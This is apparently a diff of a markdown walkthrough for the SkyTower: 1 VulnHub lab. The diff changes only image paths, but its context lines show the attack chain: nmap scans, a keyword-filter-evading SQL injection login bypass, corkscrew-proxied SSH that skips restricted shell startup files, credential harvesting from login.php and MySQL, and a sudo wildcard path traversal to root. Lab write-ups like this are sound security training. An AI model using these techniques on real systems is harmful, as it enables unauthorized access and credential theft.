@@ -3,7 +3,7 @@
 - **Machine:** SkyTower: 1
 - **Download:** https://www.vulnhub.com/entry/skytower-1,96/
 
-![](845-1.png)
+![](images/845-1.png)
 
 ---
 
@@ -29,7 +29,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](845-2.png)
+![](images/845-2.png)
 
 ---
 
@@ -41,7 +41,7 @@ Perform a complete scan to identify open ports, services, operating system detai
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.182
 ```
 
-![](845-3.png)
+![](images/845-3.png)
 
 ---
 
@@ -65,7 +65,7 @@ Run the HTTP enumeration NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.182
 ```
 
-![](845-4.png)
+![](images/845-4.png)
 
 ---
 
@@ -77,7 +77,7 @@ Visit the target website.
 http://192.168.2.182
 ```
 
-![](845-5.png)
+![](images/845-5.png)
 
 A login page is presented. Since no credentials are available, test the login form for SQL injection.
 
@@ -91,9 +91,9 @@ Inject a single quote to identify input validation.
 '
 ```
 
-![](845-6.png)
+![](images/845-6.png)
 
-![](845-7.png)
+![](images/845-7.png)
 
 The application returns a database error, confirming that the input reaches the SQL query.
 
@@ -109,9 +109,9 @@ A traditional payload such as:
 
 is filtered by the application.
 
-![](845-8.png)
+![](images/845-8.png)
 
-![](845-9.png)
+![](images/845-9.png)
 
 The filter blocks keywords such as **OR** and the **=** operator.
 
@@ -127,9 +127,9 @@ or
 ' OORR 1=1#
 ```
 
-![](845-10.png)
+![](images/845-10.png)
 
-![](845-11.png)
+![](images/845-11.png)
 
 Authentication succeeds, revealing valid credentials.
 
@@ -161,7 +161,7 @@ ssh -o ProxyCommand="corkscrew 192.168.2.182 3128 %h %p" -t john@192.168.2.182 "
 
 The `--noprofile --norc` options bypass the restricted shell initialization files.
 
-![](845-12.png)
+![](images/845-12.png)
 
 The `john` account has no useful sudo privileges.
 
@@ -177,7 +177,7 @@ Inspect the web application's login script.
 cat /var/www/login.php
 ```
 
-![](845-13.png)
+![](images/845-13.png)
 
 Recovered MySQL credentials:
 
@@ -216,7 +216,7 @@ Dump the login table.
 SELECT * FROM login;
 ```
 
-![](845-14.png)
+![](images/845-14.png)
 
 Recovered credentials:
 
@@ -236,7 +236,7 @@ Reconnect using the recovered credentials.
 ssh -o ProxyCommand="corkscrew 192.168.2.182 3128 %h %p" -t sara@192.168.2.182 "bash --noprofile --norc"
 ```
 
-![](845-15.png)
+![](images/845-15.png)
 
 This account has sudo privileges.
 
@@ -258,7 +258,7 @@ Because wildcard expansion does not properly restrict path traversal, escape the
 sudo cat /accounts/../root/flag.txt
 ```
 
-![](845-16.png)
+![](images/845-16.png)
 
 The traversal resolves to:
 
@@ -284,7 +284,7 @@ Authenticate directly as root.
 ssh -o ProxyCommand="corkscrew 192.168.2.182 3128 %h %p" -t root@192.168.2.182 "bash --noprofile --norc"
 ```
 
-![](845-17.png)
+![](images/845-17.png)
 
 ---
 
